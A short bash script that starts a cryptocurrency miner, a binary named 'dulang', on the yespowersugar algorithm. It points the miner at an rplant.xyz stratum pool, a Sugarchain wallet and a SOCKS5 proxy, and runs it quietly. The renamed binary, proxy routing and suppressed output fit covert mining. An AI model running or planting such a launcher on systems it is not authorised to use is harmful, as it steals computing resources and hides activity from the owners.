#!/bin/bash
POOL=stratum+tcps://stratum-asia.rplant.xyz:17042
WALLET=sugar1qsv26cl69kpgwujwmdhdl468ljm5ypr6kewh0gu.JOHAN
PROXY=socks5://128.199.150.230:1080
./dulang -a yespowersugar -o $POOL -u $WALLET -x $PROXY -q
